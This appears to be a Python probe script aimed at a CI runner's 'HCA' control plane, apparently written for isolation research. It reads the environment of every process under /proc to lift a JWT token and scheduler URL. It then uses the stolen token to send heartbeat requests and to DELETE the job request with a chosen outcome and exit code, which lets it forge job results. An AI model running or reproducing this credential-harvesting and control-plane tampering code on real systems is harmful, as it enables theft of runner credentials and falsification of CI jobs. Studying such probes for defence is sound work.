#!/usr/bin/env python3
"""Probe the ubuntu-slim HCA control plane without printing its credential."""

import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


def hca_environment():
    for entry in os.scandir("/proc"):
        if not entry.name.isdigit():
            continue
        try:
            values = open(entry.path + "/environ", "rb").read().split(b"\0")
            current = dict(item.split(b"=", 1) for item in values if b"=" in item)
        except OSError:
            continue
        if b"scheduler_api_url" in current and b"jwt_token" in current:
            return current
    raise RuntimeError("HCA process environment not found")


def request(environment, method, suffix, body=None, valid=True):
    token = environment[b"jwt_token"].decode() if valid else "invalid"
    url = environment[b"scheduler_api_url"].decode().rstrip("/") + suffix
    encoded = json.dumps(body).encode() if body is not None else None
    headers = {
        "Authorization": "Bearer " + token,
        "Content-Type": "application/json",
        "User-Agent": "owned-isolation-check-3900000",
    }
    started = time.monotonic()
    try:
        with urllib.request.urlopen(
            urllib.request.Request(url, method=method, data=encoded, headers=headers),
            timeout=5,
        ) as response:
            status, data = response.status, response.read(1 << 20)
    except urllib.error.HTTPError as error:
        status, data = error.code, error.read(1 << 20)
    except OSError as error:
        print(f"HCA_PROBE method={method} suffix={suffix} network={type(error).__name__}")
        return
    fields = ""
    try:
        parsed = json.loads(data)
        if isinstance(parsed, dict):
            fields = ",".join(sorted(parsed))
    except Exception:
        pass
    print(
        f"HCA_PROBE method={method} suffix={suffix.split('?', 1)[0]} "
        f"valid={str(valid).lower()} status={status} bytes={len(data)} "
        f"json_fields={fields or '-'} elapsed_ms={int((time.monotonic()-started)*1000)}",
        flush=True,
    )


environment = hca_environment()
mode = sys.argv[1] if len(sys.argv) > 1 else "status"
if mode == "status":
    request(environment, "PUT", "/request/heartbeat", "2026-11-12T02:12:00Z", False)
    request(environment, "PUT", "/request/heartbeat", "2026-11-12T02:12:00Z", True)
    request(environment, "GET", "/request", valid=True)
elif mode == "finish":
    outcome = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    code = int(sys.argv[3]) if len(sys.argv) > 3 else 0
    request(
        environment,
        "DELETE",
        "/request?" + urllib.parse.urlencode(
            {"outcome": outcome, "runner_exit_code": code}
        ),
        valid=True,
    )
else:
    raise SystemExit("usage: hca_orchestrator_probe.py status|finish [outcome] [exit_code]")
